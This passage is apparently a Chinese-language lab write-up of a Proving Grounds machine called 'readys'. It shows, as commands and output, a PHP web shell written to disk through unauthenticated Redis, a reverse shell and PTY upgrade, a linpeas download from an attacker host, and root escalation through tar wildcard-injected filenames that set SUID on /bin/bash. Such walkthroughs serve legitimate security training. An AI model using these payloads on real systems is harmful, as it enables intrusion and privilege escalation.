+<p><img loading="lazy" decoding="async" width="1024" height="161" src="../legacy/uploads/2025/05/1748420484-image-1024x161.png" alt="" class="wp-image-1452" srcset="../legacy/uploads/2025/05/1748420484-image-1024x161.png 1024w, ../legacy/uploads/2025/05/1748420484-image-300x47.png 300w, ../legacy/uploads/2025/05/1748420484-image-768x120.png 768w, ../legacy/uploads/2025/05/1748420484-image-1536x241.png 1536w, ../legacy/uploads/2025/05/1748420484-image.png 1913w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>尝试在/opt/redis-files下写入文件：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+192.168.201.166:6379&gt; config set dir /opt/redis-files
+OK
+192.168.201.166:6379&gt; config set dbfilename redis.php
+OK
+192.168.201.166:6379&gt; set test "&lt;?php system($_GET&#x5B;&#039;cmd&#039;]); ?&gt;"
+OK
+192.168.201.166:6379&gt; save
+OK
+</pre>
+</div>
+<p>终于成功，接下来就可以利用LFI来访问刚刚创建的php文件.<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="112" src="../legacy/uploads/2025/05/1748420641-image-1024x112.png" alt="" class="wp-image-1455" srcset="../legacy/uploads/2025/05/1748420641-image-1024x112.png 1024w, ../legacy/uploads/2025/05/1748420641-image-300x33.png 300w, ../legacy/uploads/2025/05/1748420641-image-768x84.png 768w, ../legacy/uploads/2025/05/1748420641-image-1536x169.png 1536w, ../legacy/uploads/2025/05/1748420641-image.png 1896w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>成功执行命令. 尝试获得reverse shell:<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="91" src="../legacy/uploads/2025/05/1748420835-image-1024x91.png" alt="" class="wp-image-1458" srcset="../legacy/uploads/2025/05/1748420835-image-1024x91.png 1024w, ../legacy/uploads/2025/05/1748420835-image-300x27.png 300w, ../legacy/uploads/2025/05/1748420835-image-768x68.png 768w, ../legacy/uploads/2025/05/1748420835-image.png 1239w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>没有连接.. 可能是编码的问题？用url编码试试. 随便找了个<a href="https://www.urlencoder.org/" target="_blank"  rel="nofollow" >url encoder</a>网站：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="739" src="../legacy/uploads/2025/05/1748420943-image-1024x739.png" alt="" class="wp-image-1460" srcset="../legacy/uploads/2025/05/1748420943-image-1024x739.png 1024w, ../legacy/uploads/2025/05/1748420943-image-300x216.png 300w, ../legacy/uploads/2025/05/1748420943-image-768x554.png 768w, ../legacy/uploads/2025/05/1748420943-image.png 1400w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>再次尝试：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="976" height="77" src="../legacy/uploads/2025/05/1748420965-image.png" alt="" class="wp-image-1462" srcset="../legacy/uploads/2025/05/1748420965-image.png 976w, ../legacy/uploads/2025/05/1748420965-image-300x24.png 300w, ../legacy/uploads/2025/05/1748420965-image-768x61.png 768w" sizes="auto, (max-width: 976px) 100vw, 976px" /> </figure> <figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="859" height="132" src="../legacy/uploads/2025/05/1748420977-image.png" alt="" class="wp-image-1463" srcset="../legacy/uploads/2025/05/1748420977-image.png 859w, ../legacy/uploads/2025/05/1748420977-image-300x46.png 300w, ../legacy/uploads/2025/05/1748420977-image-768x118.png 768w" sizes="auto, (max-width: 859px) 100vw, 859px" /></figure></p>
+<p>成功获得shell. 用python升级一下刀tty shell.</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: python; title: ; notranslate" title="">
+python3 -c &#039;import pty;pty.spawn("/bin/bash")&#039;
+</pre>
+</div>
+<p>在alice home下找到local.txt<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="356" height="69" src="../legacy/uploads/2025/05/1748421080-image.png" alt="" class="wp-image-1465" srcset="../legacy/uploads/2025/05/1748421080-image.png 356w, ../legacy/uploads/2025/05/1748421080-image-300x58.png 300w" sizes="auto, (max-width: 356px) 100vw, 356px" /> </figure></p>
+<h2 id="root">Root
+</h2><p>上传linpeas并运行：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+alice@readys:/home/alice$ curl -o lin http://192.168.45.202/linpeas
+curl -o lin http://192.168.45.202/linpeas
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 3151k  100 3151k    0     0   430k      0  0:00:07  0:00:07 --:--:--  488k
+alice@readys:/home/alice$ chmod +x lin
+chmod +x lin
+alice@readys:/home/alice$ ./lin
+</pre>
+</div><figure class="wp-block-image size-full">
+<p><img loading="lazy" decoding="async" width="511" height="35" src="../legacy/uploads/2025/05/1748421215-image.png" alt="" class="wp-image-1469" srcset="../legacy/uploads/2025/05/1748421215-image.png 511w, ../legacy/uploads/2025/05/1748421215-image-300x21.png 300w" sizes="auto, (max-width: 511px) 100vw, 511px" /> </figure></p>
+<p>发现root运行了一个cronjob, 看看这个文件里是什么:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+cat /usr/local/bin/backup.sh
+#!/bin/bash
+<p>cd /var/www/html
+if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
+tar -cf /opt/backups/website.tar *
+fi
+</pre></p>
+</div>
+<p>这个任务会先进入/var/www/html, 并把目录下的文件打包起来。***** 使得我们可以把文件名当做参数传递给 tar. 看到tar 和 * 就能想到wildcard attack了，之前有做过这样的靶机. 这篇<a href="https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa" target="_blank"  rel="nofollow" >博客</a>里有详细教程.</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+cd /var/www/html
+echo "12312331232231" &gt; &#039;--checkpoint=1&#039;
+echo "1212331232231312" &gt; &#039;--checkpoint-action=exec=sh pe.sh&#039;
+echo "chmod u+s /bin/bash" &gt; pe.sh
+</pre>
+</div>
+<p>登记分钟后, /bin/bash就会被加上 suid:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+alice@readys:/var/www/html$ ls -l /bin/bash
+ls -l /bin/bash
+-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+alice@readys:/var/www/html$ /bin/bash -p
+/bin/bash -p
+bash-5.0# id
+id
+uid=1000(alice) gid=1000(alice) euid=0(root) groups=1000(alice)
+bash-5.0# cd /root
+cd /root
+bash-5.0# ls
+ls
+proof.txt
+</pre>
+</div>
+<p>在root下找到proof.txt</p>
+<h2 id="我学到了什么">我学到了什么
+</h2><ul class="wp-block-list">
+  <li>
+    /etc/systemd/system/xxx.service文件 包含有service的信息 例如读写权限
+  </li>
+</ul>
+<p>Happy Hacking</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on May 28, 2025 08:43 UTC
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/oscp-pgp-clue-writeup/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">OSCP-PGP Clue Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Jowhite
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.c360ad02a41a6ed7f0240895667de2af6b7bfd79a8c71b3ed3008667720bb9d1.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+     
+    :root {
+        --article-font-family: "Merriweather", var(--base-font-family);
+    }
+</style>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700&display=swap";
+    
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+    
+        document.head.appendChild(customFont);
+    }());
+</script>
+    </body>
+</html>
